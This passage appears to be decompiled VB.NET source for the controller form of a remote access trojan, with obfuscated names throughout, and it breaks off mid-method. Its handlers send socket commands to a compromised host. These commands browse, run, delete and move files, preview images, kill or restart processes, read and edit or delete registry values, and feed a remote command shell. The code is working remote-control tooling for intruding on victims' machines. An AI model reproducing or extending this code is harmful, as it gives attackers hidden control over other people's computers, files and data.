		' (get) Token: 0x060002FE RID: 766 RVA: 0x000193F4 File Offset: 0x000175F4
		' (set) Token: 0x060002FF RID: 767 RVA: 0x00002E8E File Offset: 0x0000108E
		Friend Overridable Property ColumnHeader12 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader12
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader12 = value
			End Set
		End Property

		' Token: 0x17000129 RID: 297
		' (get) Token: 0x06000300 RID: 768 RVA: 0x0001940C File Offset: 0x0001760C
		' (set) Token: 0x06000301 RID: 769 RVA: 0x00002E97 File Offset: 0x00001097
		Friend Overridable Property ColumnHeader13 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader13
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader13 = value
			End Set
		End Property

		' Token: 0x1700012A RID: 298
		' (get) Token: 0x06000302 RID: 770 RVA: 0x00019424 File Offset: 0x00017624
		' (set) Token: 0x06000303 RID: 771 RVA: 0x00002EA0 File Offset: 0x000010A0
		Friend Overridable Property ColumnHeader14 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader14
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader14 = value
			End Set
		End Property

		' Token: 0x1700012B RID: 299
		' (get) Token: 0x06000304 RID: 772 RVA: 0x0001943C File Offset: 0x0001763C
		' (set) Token: 0x06000305 RID: 773 RVA: 0x00002EA9 File Offset: 0x000010A9
		Friend Overridable Property ColumnHeader15 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader15
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader15 = value
			End Set
		End Property

		' Token: 0x1700012C RID: 300
		' (get) Token: 0x06000306 RID: 774 RVA: 0x00019454 File Offset: 0x00017654
		' (set) Token: 0x06000307 RID: 775 RVA: 0x00002EB2 File Offset: 0x000010B2
		Friend Overridable Property vmethod_108 As ImageList
			<DebuggerNonUserCode()>
			Get
				Return Me._vmethod_108
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ImageList)
				Me._vmethod_108 = value
			End Set
		End Property

		' Token: 0x06000308 RID: 776 RVA: 0x0001946C File Offset: 0x0001766C
		Public Sub New()
			AddHandler MyBase.FormClosing, AddressOf Me.Manager_FormClosing
			AddHandler MyBase.Load, AddressOf Me.Manager_Load
			AddHandler MyBase.Resize, AddressOf Me.Manager_Resize
			Manager.__ENCAddToList(Me)
			Me.RGCH = New Collection()
			Me.string_0 = String.Empty
			Me.Images = New Collection()
			Me.Cache = New Collection()
			Me.isCut = False
			Me.Flist = String.Empty
			Me.TCPFX = True
			Me.PRFX = True
			Me.SrvFX = True
			Me.srvNxt = True
			Me.PID = 0
			Me.PRNXT = True
			Me.TCPNXT = True
			Me.string_1 = New String(4) {}
			Me.int_0 = 0
			Me.int_1 = 0
			Me.cur = Manager.CR.fm
			Me.shStarted = 0
			Me.InitializeComponent()
		End Sub

		' Token: 0x06000309 RID: 777 RVA: 0x0001955C File Offset: 0x0001775C
		Public Sub exp(x As String, Optional Refresh As Boolean = False)
			Try
				Dim text As String = x.Replace("\\", "\")
				If Not text.EndsWith("\") Then
					text += "\"
				End If
				Me.TextBox1.Text = text
				Dim pr As ToolStripProgressBar = Me.pr
				Dim obj As ToolStripProgressBar = pr
				SyncLock obj
					Me.p.Image = Nothing
					Me.p.Visible = False
					Me.TextBox1.BackColor = Color.IndianRed
					If Refresh AndAlso Me.Cache.Contains(text) Then
						Me.Cache.Remove(text)
					End If
					If Me.Cache.Contains(text) Then
						Me.TextBox1.BackColor = Color.Pink
						Dim gclass As Manager.GClass14 = CType(Me.Cache(text), Manager.GClass14)
						Me.pr.Value = 0
						Me.pr.Maximum = gclass.list_1.Count + gclass.list_0.Count
						Me.L2.Items.Clear()
						If New DirectoryInfo(text).Parent IsNot Nothing Then
							Dim listViewItem As ListViewItem = Me.L2.Items.Add("..", "..", 0)
							listViewItem.SubItems.Add(String.Empty)
							listViewItem.SubItems.Add("DIR")
							listViewItem.ToolTipText = New DirectoryInfo(text).Parent.FullName + "\"
						End If
						Try
							For Each text2 As String In gclass.list_0
								Dim pr2 As ToolStripProgressBar = Me.pr
								Dim toolStripProgressBar As ToolStripProgressBar = pr2
								toolStripProgressBar.Value += 1
								Dim listViewItem2 As ListViewItem = Me.L2.Items.Add(text2, New DirectoryInfo(text2).Name, 0)
								listViewItem2.SubItems.Add(String.Empty)
								listViewItem2.SubItems.Add("DIR")
								listViewItem2.ToolTipText = text2
							Next
						Finally
							Dim enumerator As List(Of String).Enumerator
							CType(enumerator, IDisposable).Dispose()
						End Try
						Dim list As List(Of ListViewItem) = New List(Of ListViewItem)()
						Try
							For Each expression As String In gclass.list_1
								Dim pr2 As ToolStripProgressBar = Me.pr
								Dim toolStripProgressBar As ToolStripProgressBar = pr2
								toolStripProgressBar.Value += 1
								Dim array As String() = Strings.Split(expression, "*", -1, CompareMethod.Binary)
								Dim fileInfo As FileInfo = New FileInfo(array(0))
								Dim listViewItem3 As ListViewItem = New ListViewItem(fileInfo.Name, 1)
								Dim listViewItem4 As ListViewItem = listViewItem3
								listViewItem4.ToolTipText = fileInfo.FullName
								listViewItem4.SubItems.Add(array(1))
								listViewItem4.SubItems.Add(array(2))
								listViewItem4.Name = listViewItem4.ToolTipText
								If Not Me.Images.Contains("!" + listViewItem4.ToolTipText) Then
									GoTo IL_3D9
								End If
								Try
									If Not Me.vmethod_108.Images.ContainsKey(listViewItem4.ToolTipText) Then
										Dim array2 As Object() = New Object(1) {}
										Dim listViewItem5 As ListViewItem = listViewItem4
										array2(0) = listViewItem5.ToolTipText
										array2(1) = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Me.Images(listViewItem4.ToolTipText))))
										Dim array3 As Object() = array2
										Dim array4 As Boolean() = New Boolean() { True, False }
										NewLateBinding.LateCall(Me.vmethod_108.Images, Nothing, "Add", array3, Nothing, Nothing, array4, True)
										If array4(0) Then
											listViewItem5.ToolTipText = Conversions.ToString(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array3(0)))), GetType(String)))
										End If
									End If
									GoTo IL_4D3
								Catch ex As Exception
									GoTo IL_4D3
								End Try
								GoTo IL_3D9
								IL_4D3:
								listViewItem4.ImageKey = listViewItem4.ToolTipText
								IL_494:
								listViewItem4 = Nothing
								list.Add(listViewItem3)
								If list.Count > 20 Then
									Me.L2.Items.AddRange(list.ToArray())
									list.Clear()
									Continue For
								End If
								Continue For
								IL_3D9:
								If fileInfo.Extension.Length <= 0 Then
									GoTo IL_494
								End If
								If Not Me.vmethod_108.Images.ContainsKey(fileInfo.Extension) Then
									File.Create(Application.StartupPath + "\!" + fileInfo.Extension).Close()
									Me.vmethod_108.Images.Add(fileInfo.Extension, Icon.ExtractAssociatedIcon(Application.StartupPath + "\!" + fileInfo.Extension))
									File.Delete(Application.StartupPath + "\!" + fileInfo.Extension)
									listViewItem4.ImageKey = fileInfo.Extension
									GoTo IL_494
								End If
								listViewItem4.ImageKey = fileInfo.Extension
								GoTo IL_494
							Next
						Finally
							Dim enumerator2 As List(Of String).Enumerator
							CType(enumerator2, IDisposable).Dispose()
						End Try
						If list.Count > 0 Then
							Me.L2.Items.AddRange(list.ToArray())
							list.Clear()
						End If
						Me.L2.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
						Me.pr.Value = 0
					Else
						Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "fm", Class7.string_1, "!", Class7.string_1, Class6.smethod_14(text) }))
					End If
				End SyncLock
			Catch ex2 As Exception
			End Try
		End Sub

		' Token: 0x0600030A RID: 778 RVA: 0x00019B94 File Offset: 0x00017D94
		Private Sub Manager_FormClosing(sender As Object, e As FormClosingEventArgs)
			Try
				Me.Images.Clear()
			Catch ex As Exception
			End Try
			Try
				Me.Cache.Clear()
			Catch ex2 As Exception
			End Try
			If Me.sk IsNot Nothing AndAlso Me.sk.CN Then
				Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "rs", Class7.string_1, "@" }))
			End If
		End Sub

		' Token: 0x0600030B RID: 779 RVA: 0x00019C54 File Offset: 0x00017E54
		Private Sub Manager_Load(sender As Object, e As EventArgs)
			Try
				Me.LPR.Tag = Nothing
				Me.LTCP.Tag = Nothing
				Me.RGk.Nodes.Add("HKEY_CLASSES_ROOT", "HKEY_CLASSES_ROOT")
				Me.RGk.Nodes.Add("HKEY_CURRENT_USER", "HKEY_CURRENT_USER")
				Me.RGk.Nodes.Add("HKEY_LOCAL_MACHINE", "HKEY_LOCAL_MACHINE")
				Me.RGk.Nodes.Add("HKEY_USERS", "HKEY_USERS")
				Me.L2.Controls.Add(Me.p)
				Me.ListView1.Items(0).Selected = True
				Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "proc", Class7.string_1, "~" }))
				Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "fm", Class7.string_1, "~" }))
				Me.Text = Conversions.ToString(RuntimeHelpers.GetObjectValue(Class7.smethod_1(Me.sk.L)))
				Me.L2.Controls.Add(Me.p)
				Me.p.Visible = False
				Try
					Me.string_0 = Me.sk.Folder + "Downloads\"
				Catch ex As Exception
				End Try
				Me.vmethod_26.Enabled = True
			Catch ex2 As Exception
			End Try
		End Sub

		' Token: 0x0600030C RID: 780 RVA: 0x00019E54 File Offset: 0x00018054
		Private Sub Manager_Resize(sender As Object, e As EventArgs)
			Me.p.Left = Me.L2.Width - Me.p.Width - 25
			Me.p.Top = Me.L2.Height - Me.p.Height - 25
		End Sub

		' Token: 0x0600030D RID: 781 RVA: 0x00019EAC File Offset: 0x000180AC
		Private Sub KillToolStripMenuItem1_Click(sender As Object, e As EventArgs)
			Dim text As String = String.Empty
			Try
				For Each obj As Object In Me.LPR.SelectedItems
					Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
					text = text + Class7.string_1 + listViewItem.SubItems(1).Text
				Next
			Finally
				Dim enumerator As IEnumerator
				If TypeOf enumerator Is IDisposable Then
					TryCast(enumerator, IDisposable).Dispose()
				End If
			End Try
			If text.Length > 0 Then
				Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "proc", Class7.string_1, "k", text }))
			End If
		End Sub

		' Token: 0x0600030E RID: 782 RVA: 0x00019F7C File Offset: 0x0001817C
		Private Sub KillDeleteToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim text As String = String.Empty
			Try
				For Each obj As Object In Me.LPR.SelectedItems
					Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
					text = String.Concat(New String() { text, Class7.string_1, listViewItem.SubItems(1).Text, "::", listViewItem.ToolTipText })
				Next
			Finally
				Dim enumerator As IEnumerator
				If TypeOf enumerator Is IDisposable Then
					TryCast(enumerator, IDisposable).Dispose()
				End If
			End Try
			If text.Length > 0 Then
				Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "proc", Class7.string_1, "kd", text }))
			End If
		End Sub

		' Token: 0x0600030F RID: 783 RVA: 0x00002EBB File Offset: 0x000010BB
		Private Sub RefreshToolStripMenuItem2_Click(sender As Object, e As EventArgs)
			If Me.TextBox1.Text.Length > 0 Then
				Me.exp(Me.TextBox1.Text, True)
			End If
		End Sub

		' Token: 0x06000310 RID: 784 RVA: 0x00002EE4 File Offset: 0x000010E4
		Private Sub EditToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Me.RGLIST_DoubleClick(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(sender))), e)
		End Sub

		' Token: 0x06000311 RID: 785 RVA: 0x0001A070 File Offset: 0x00018270
		Private Sub RGLIST_DoubleClick(sender As Object, e As EventArgs)
			If Me.RGLIST.SelectedItems.Count <> 0 Then
				Dim listViewItem As ListViewItem = Me.RGLIST.SelectedItems(0)
				Dim rgv As RGv = New RGv() With { .Path = Me.RGk.SelectedNode.FullPath + "\", .sk = Me.sk }
				rgv.TextBox1.Text = listViewItem.Text
				rgv.ComboBox1.SelectedIndex = rgv.ComboBox1.Items.IndexOf(listViewItem.SubItems(1).Text)
				Try
					rgv.TextBox3.Text = listViewItem.SubItems(2).Text
				Catch ex As Exception
				End Try
				rgv.Text = rgv.Path
				rgv.TextBox1.[ReadOnly] = True
				rgv.ShowDialog(Me)
			End If
		End Sub

		' Token: 0x06000312 RID: 786 RVA: 0x0001A178 File Offset: 0x00018378
		Private Sub NewValueToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim rgv As RGv = New RGv() With { .Path = Me.RGk.SelectedNode.FullPath + "\", .sk = Me.sk }
			rgv.TextBox1.Text = "Name"
			rgv.ComboBox1.SelectedIndex = rgv.ComboBox1.Items.IndexOf("String")
			rgv.TextBox3.Text = "Value"
			rgv.Text = rgv.Path
			rgv.ShowDialog(Me)
		End Sub

		' Token: 0x06000313 RID: 787 RVA: 0x0001A210 File Offset: 0x00018410
		Private Sub DeleteToolStripMenuItem1_Click(sender As Object, e As EventArgs)
			Try
				For Each obj As Object In Me.RGLIST.SelectedItems
					Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
					Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "RG", Class7.string_1, "@", Class7.string_1, Me.RGk.SelectedNode.FullPath, "\", Class7.string_1, listViewItem.Text }))
				Next
			Finally
				Dim enumerator As IEnumerator
				If TypeOf enumerator Is IDisposable Then
					TryCast(enumerator, IDisposable).Dispose()
				End If
			End Try
		End Sub

		' Token: 0x06000314 RID: 788 RVA: 0x0001A2EC File Offset: 0x000184EC
		Private Sub T2_KeyDown(sender As Object, e As KeyEventArgs)
			Dim keyCode As Keys = e.KeyCode
			If keyCode = Keys.[Return] Then
				Dim text As String = Me.T2.Text
				Me.T2.Text = String.Empty
				e.SuppressKeyPress = True
				Me.string_1(Me.int_1) = text
				Me.int_1 += 1
				If Me.int_1 > Me.string_1.Length - 1 Then
					Me.int_1 = 0
				End If
				Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "rs", Class7.string_1, "!", Class7.string_1, Class6.smethod_14(text) }))
			ElseIf keyCode = Keys.Down Then
				Me.int_0 += -1
				If Me.int_0 < 0 Then
					Me.int_0 = 0
				End If
				Me.T2.Text = Me.string_1(Me.int_0)
			ElseIf keyCode = Keys.Up Then
				Me.int_0 += 1
				If Me.int_0 > Me.string_1.Length - 1 Then
					Me.int_0 = Me.string_1.Length - 1
				End If
				Me.T2.Text = Me.string_1(Me.int_0)
			End If
		End Sub

		' Token: 0x06000315 RID: 789 RVA: 0x00002EFD File Offset: 0x000010FD
		Private Sub sh_Resize(sender As Object, e As EventArgs)
			Me.T1.ScrollToCaret()
		End Sub

		' Token: 0x06000316 RID: 790 RVA: 0x0001A450 File Offset: 0x00018650
		Private Sub RGk_AfterCollapse(sender As Object, e As TreeViewEventArgs)
			Dim gclass As Manager.GClass13
			If Me.RGCH.Contains(e.Node.FullPath + "\") Then
				gclass = CType(Me.RGCH(e.Node.FullPath + "\"), Manager.GClass13)
			End If
			If gclass Is Nothing Then
				Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "RG", Class7.string_1, "~", Class7.string_1, e.Node.FullPath, "\" }))
			ElseIf gclass.list_0.Count = 0 And gclass.list_1.Count = 0 Then
				Me.RGLIST.Items.Clear()
				Me.RGk.Enabled = False
				Me.RGLIST.Enabled = False
				Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "RG", Class7.string_1, "~", Class7.string_1, e.Node.FullPath, "\" }))
			Else
				Me.RGLIST.Items.Clear()
				Try
					For Each array As String() In gclass.list_0
						Dim listViewItem As ListViewItem = Me.RGLIST.Items.Add(array(0))
						listViewItem.SubItems.Add(array(1))
						listViewItem.SubItems.Add(array(2))
						If Operators.CompareString(array(1), "String", False) = 0 Then
							listViewItem.ImageIndex = 1
						Else
							listViewItem.ImageIndex = 2
						End If
					Next
				Finally
					Dim enumerator As List(Of String()).Enumerator
					CType(enumerator, IDisposable).Dispose()
				End Try
				Me.RGLIST.method_3()
			End If
		End Sub

		' Token: 0x06000317 RID: 791 RVA: 0x0001A450 File Offset: 0x00018650
		Private Sub RGk_AfterExpand(sender As Object, e As TreeViewEventArgs)
			Dim gclass As Manager.GClass13
			If Me.RGCH.Contains(e.Node.FullPath + "\") Then
				gclass = CType(Me.RGCH(e.Node.FullPath + "\"), Manager.GClass13)
			End If
			If gclass Is Nothing Then
				Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "RG", Class7.string_1, "~", Class7.string_1, e.Node.FullPath, "\" }))
			ElseIf gclass.list_0.Count = 0 And gclass.list_1.Count = 0 Then
				Me.RGLIST.Items.Clear()
				Me.RGk.Enabled = False
				Me.RGLIST.Enabled = False
				Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "RG", Class7.string_1, "~", Class7.string_1, e.Node.FullPath, "\" }))
			Else
				Me.RGLIST.Items.Clear()
				Try
					For Each array As String() In gclass.list_0
						Dim listViewItem As ListViewItem = Me.RGLIST.Items.Add(array(0))
						listViewItem.SubItems.Add(array(1))
						listViewItem.SubItems.Add(array(2))
						If Operators.CompareString(array(1), "String", False) = 0 Then
							listViewItem.ImageIndex = 1
						Else
							listViewItem.ImageIndex = 2
						End If
					Next
				Finally
					Dim enumerator As List(Of String()).Enumerator
					CType(enumerator, IDisposable).Dispose()
				End Try
				Me.RGLIST.method_3()
			End If
		End Sub

		' Token: 0x06000318 RID: 792 RVA: 0x0001A674 File Offset: 0x00018874
		Private Sub RGk_AfterSelect(sender As Object, e As TreeViewEventArgs)
			Dim gclass As Manager.GClass13
			If Me.RGCH.Contains(e.Node.FullPath + "\") Then
				gclass = CType(Me.RGCH(e.Node.FullPath + "\"), Manager.GClass13)
			End If
			If gclass Is Nothing Then
				Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "RG", Class7.string_1, "~", Class7.string_1, e.Node.FullPath, "\" }))
			ElseIf gclass.list_0.Count = 0 And gclass.list_1.Count = 0 Then
				Me.RGLIST.Items.Clear()
				Me.RGk.Enabled = False
				Me.RGLIST.Enabled = False
				Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "RG", Class7.string_1, "~", Class7.string_1, e.Node.FullPath, "\" }))
			Else
				Me.RGLIST.Items.Clear()
				Try
					For Each array As String() In gclass.list_0
						Dim listViewItem As ListViewItem = Me.RGLIST.Items.Add(array(0))
						listViewItem.SubItems.Add(array(1))
						listViewItem.SubItems.Add(array(2))
						If Operators.CompareString(array(1), "String", False) = 0 Then
							listViewItem.ImageIndex = 1
						Else
							listViewItem.ImageIndex = 2
						End If
					Next
				Finally
					Dim enumerator As List(Of String()).Enumerator
					CType(enumerator, IDisposable).Dispose()
				End Try
				Me.RGLIST.method_3()
				If Not e.Node.IsExpanded Then
					e.Node.Expand()
				End If
			End If
		End Sub

		' Token: 0x06000319 RID: 793 RVA: 0x0001A8B4 File Offset: 0x00018AB4
		Private Sub RestartProcessToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim text As String = String.Empty
			Try
				For Each obj As Object In Me.LPR.SelectedItems
					Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
					text = String.Concat(New String() { text, Class7.string_1, listViewItem.SubItems(1).Text, "::", listViewItem.ToolTipText, "::", listViewItem.SubItems(4).Text })
				Next
			Finally
				Dim enumerator As IEnumerator
				If TypeOf enumerator Is IDisposable Then
					TryCast(enumerator, IDisposable).Dispose()
				End If
			End Try
			If text.Length > 0 Then
				Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "proc", Class7.string_1, "re", text }))
			End If
		End Sub

		' Token: 0x0600031A RID: 794 RVA: 0x0001A9C4 File Offset: 0x00018BC4
		Private Sub RefreshToolStripMenuItem_Click(sender As Object, e As EventArgs)
			If Me.RGk.SelectedNode IsNot Nothing Then
				Me.RGk.Enabled = False
				Me.RGLIST.Enabled = False
				Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "RG", Class7.string_1, "~", Class7.string_1, Me.RGk.SelectedNode.FullPath, "\" }))
			End If
		End Sub

		' Token: 0x0600031B RID: 795 RVA: 0x0001AA60 File Offset: 0x00018C60
		Private Sub L2_DoubleClick(sender As Object, e As EventArgs)
			If Me.L2.SelectedItems.Count <> 0 Then
				If Operators.CompareString(Me.L2.SelectedItems(0).SubItems(2).Text, "DIR", False) = 0 Then
					Me.exp(Me.L2.SelectedItems(0).ToolTipText, False)
				Else
					Dim array As String() = New String(6) {}
					array(0) = "Ex"
					array(1) = Class7.string_1
					array(2) = "fm"
					array(3) = Class7.string_1
					array(4) = "rd"
					array(5) = Class7.string_1
					Dim listViewItem As ListViewItem = Me.L2.SelectedItems(0)
					Dim toolTipText As String = listViewItem.ToolTipText
					listViewItem.ToolTipText = toolTipText
					array(6) = Class6.smethod_14(toolTipText)
					Me.sk.Send(String.Concat(array))
				End If
			End If
		End Sub

		' Token: 0x0600031C RID: 796 RVA: 0x0001AB4C File Offset: 0x00018D4C
		Private Sub L2_SelectedIndexChanged(sender As Object, e As EventArgs)
			Me.p.Image = Nothing
			Me.p.Visible = False
			If Me.L2.SelectedItems.Count = 1 Then
				Dim listViewItem As ListViewItem = Me.L2.SelectedItems(0)
				If Me.Images.Contains(listViewItem.ToolTipText) Then
					Me.p.Image = CType(Me.Images(listViewItem.ToolTipText), Image)
					Me.p.Visible = True
				ElseIf listViewItem.SubItems(2).Text.Length > 0 AndAlso ".jpg.jpeg.png.ico.bmp.tiff.gif".Contains(listViewItem.SubItems(2).Text.ToLower()) Then
					Dim array As String() = New String(10) {}
					array(0) = "Ex"
					array(1) = Class7.string_1
					array(2) = "fm"
					array(3) = Class7.string_1
					array(4) = "#"
					array(5) = Class7.string_1
					Dim listViewItem2 As ListViewItem = listViewItem
					Dim toolTipText As String = listViewItem2.ToolTipText
					listViewItem2.ToolTipText = toolTipText
					array(6) = Class6.smethod_14(toolTipText)
					array(7) = Class7.string_1
					array(8) = Conversions.ToString(Me.p.Width)
					array(9) = Class7.string_1
					array(10) = Conversions.ToString(Me.p.Height)
					Me.sk.Send(String.Concat(array))
				End If
			End If
		End Sub

		' Token: 0x0600031D RID: 797 RVA: 0x00002F0A File Offset: 0x0000110A
		Private Sub UPToolStripMenuItem_Click(sender As Object, e As EventArgs)
			If Me.L2.Items.ContainsKey("..") Then
				Me.exp(Me.L2.Items("..").ToolTipText, False)
			End If
		End Sub

		' Token: 0x0600031E RID: 798 RVA: 0x0001ACC0 File Offset: 0x00018EC0
		Private Sub RunToolStripMenuItem_Click(sender As Object, e As EventArgs)
			If Me.L2.SelectedItems.Count > 0 Then
				Dim text As String = String.Concat(New String() { "Ex", Class7.string_1, "fm", Class7.string_1, "rn" })
				Try
					For Each obj As Object In Me.L2.SelectedItems
						Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
						Dim toolTipText As String = listViewItem.ToolTipText
						listViewItem.ToolTipText = toolTipText
						text = text + Class7.string_1 + Class6.smethod_14(toolTipText)
					Next
				Finally
					Dim enumerator As IEnumerator
					If TypeOf enumerator Is IDisposable Then
						TryCast(enumerator, IDisposable).Dispose()
					End If
				End Try
				Me.sk.Send(text)
			End If
		End Sub

		' Token: 0x0600031F RID: 799 RVA: 0x0001AD9C File Offset: 0x00018F9C
		Private Sub DeleteToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				If Me.L2.SelectedItems.Count > 0 Then
					Dim text As String = String.Concat(New String() { "Ex", Class7.string_1, "fm", Class7.string_1, "dl", Class7.string_1 })
					Try
						Try
							For Each obj As Object In Me.L2.SelectedItems
								Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
								If Operators.CompareString(listViewItem.Text, "..", False) <> 0 Then
									If Operators.CompareString(listViewItem.SubItems(2).Text, "DIR", False) = 0 Then
										Dim str As String = text
										Dim str2 As String = Class7.string_1
										Dim text2 As String = listViewItem.ToolTipText + "*!"
										Dim str3 As String = Class6.smethod_14(text2)
										text = str + str2 + str3
									Else
										Dim str4 As String = text
										Dim str5 As String = Class7.string_1
										Dim text3 As String = listViewItem.ToolTipText + "*"
										Dim str6 As String = Class6.smethod_14(text3)
										text = str4 + str5 + str6
									End If
								End If
							Next
						Finally
							Dim enumerator As IEnumerator
							If TypeOf enumerator Is IDisposable Then
								TryCast(enumerator, IDisposable).Dispose()
							End If
						End Try
					Finally
						Dim enumerator2 As IEnumerator
						If TypeOf enumerator2 Is IDisposable Then
							TryCast(enumerator2, IDisposable).Dispose()
						End If
					End Try
					Me.sk.Send(text)
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000320 RID: 800 RVA: 0x0001AF74 File Offset: 0x00019174
		Private Sub RenameToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				For Each obj As Object In Me.L2.SelectedItems
					Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
					If Operators.CompareString(listViewItem.Text, "..", False) <> 0 Then
						If Operators.CompareString(listViewItem.SubItems(2).Text, "DIR", False) = 0 Then
							Dim text As String = Interaction.InputBox(String.Empty, "Rename", listViewItem.Text, -1, -1)
							If text.Length > 0 Then
								Dim client As Client = Me.sk
								Dim array As String() = New String(6) {}
								array(0) = "Ex"
								array(1) = Class7.string_1
								array(2) = "fm"
								array(3) = Class7.string_1
								array(4) = "nm"
								array(5) = Class7.string_1
								Dim array2 As String() = array
								Dim num As Integer = 6
								Dim text2 As String = listViewItem.ToolTipText + "*" + text + "*!"
								array2(num) = Class6.smethod_14(text2)
								client.Send(String.Concat(array))
							End If
						Else
							Dim text3 As String = Interaction.InputBox(String.Empty, "Rename", listViewItem.Text, -1, -1)
							If text3.Length > 0 Then
								Dim client2 As Client = Me.sk
								Dim array As String() = New String(6) {}
								array(0) = "Ex"
								array(1) = Class7.string_1
								array(2) = "fm"
								array(3) = Class7.string_1
								array(4) = "nm"
								array(5) = Class7.string_1
								Dim array3 As String() = array
								Dim num2 As Integer = 6
								Dim text2 As String = listViewItem.ToolTipText + "*" + text3 + "*"
								array3(num2) = Class6.smethod_14(text2)
								client2.Send(String.Concat(array))
							End If
						End If
					End If
				Next
			Finally
				Dim enumerator As IEnumerator
				If TypeOf enumerator Is IDisposable Then
					TryCast(enumerator, IDisposable).Dispose()
				End If
			End Try
		End Sub

		' Token: 0x06000321 RID: 801 RVA: 0x00002F44 File Offset: 0x00001144
		Private Sub SL_Click(sender As Object, e As EventArgs)
			Me.SL.Text = String.Empty
		End Sub

		' Token: 0x06000322 RID: 802 RVA: 0x0001B14C File Offset: 0x0001934C
		Private Sub CopyToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim text As String = String.Empty
			Try
				For Each obj As Object In Me.L2.SelectedItems
					Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
					If Operators.CompareString(listViewItem.Text, "..", False) = 0 Then
						GoTo IL_5D
					End If
					If Operators.CompareString(listViewItem.SubItems(2).Text, "DIR", False) = 0 Then
						GoTo IL_5D
					End If
					Dim flag As Boolean = True
					IL_5E:
					If flag Then
						text = text + "*" + listViewItem.ToolTipText
						Continue For
					End If
					Continue For
					IL_5D:
					flag = False
					GoTo IL_5E
				Next
			Finally
				Dim enumerator As IEnumerator
				If TypeOf enumerator Is IDisposable Then
					TryCast(enumerator, IDisposable).Dispose()
				End If
			End Try
			If Operators.CompareString(text, String.Empty, False) <> 0 Then
				Me.Flist = text.Remove(0, 1)
				Me.isCut = False
			End If
		End Sub

		' Token: 0x06000323 RID: 803 RVA: 0x0001B228 File Offset: 0x00019428
		Private Sub CutToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim text As String = String.Empty
			Try
				For Each obj As Object In Me.L2.SelectedItems
					Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
					If Operators.CompareString(listViewItem.Text, "..", False) = 0 Then
						GoTo IL_5D
					End If
					If Operators.CompareString(listViewItem.SubItems(2).Text, "DIR", False) = 0 Then
						GoTo IL_5D
					End If
					Dim flag As Boolean = True
					IL_5E:
					If flag Then
						text = text + "*" + listViewItem.ToolTipText
						Continue For
					End If
					Continue For
					IL_5D:
					flag = False
					GoTo IL_5E
				Next
			Finally
				Dim enumerator As IEnumerator
				If TypeOf enumerator Is IDisposable Then
					TryCast(enumerator, IDisposable).Dispose()
				End If
			End Try
			If Operators.CompareString(text, String.Empty, False) <> 0 Then
				Me.Flist = text.Remove(0, 1)
				Me.isCut = True
			End If
		End Sub

		' Token: 0x06000324 RID: 804 RVA: 0x0001B304 File Offset: 0x00019504
		Private Sub PasteToolStripMenuItem_Click(sender As Object, e As EventArgs)
			If Operators.CompareString(Me.Flist, String.Empty, False) <> 0 Then
				If Me.isCut Then
					Dim client As Client = Me.sk
					Dim array As String() = New String(8) {}
					array(0) = "Ex"
					array(1) = Class7.string_1
					array(2) = "fm"
					array(3) = Class7.string_1
					array(4) = "mv"
					array(5) = Class7.string_1
					Dim array2 As String() = array
					Dim num As Integer = 6
					Dim text As String = (Me.TextBox1.Text + "\").Replace("\\", "\")
					array2(num) = Class6.smethod_14(text)
					array(7) = Class7.string_1
					array(8) = Class6.smethod_14(Me.Flist)
					client.Send(String.Concat(array))
				Else
					Dim client2 As Client = Me.sk
					Dim array As String() = New String(8) {}
					array(0) = "Ex"
					array(1) = Class7.string_1
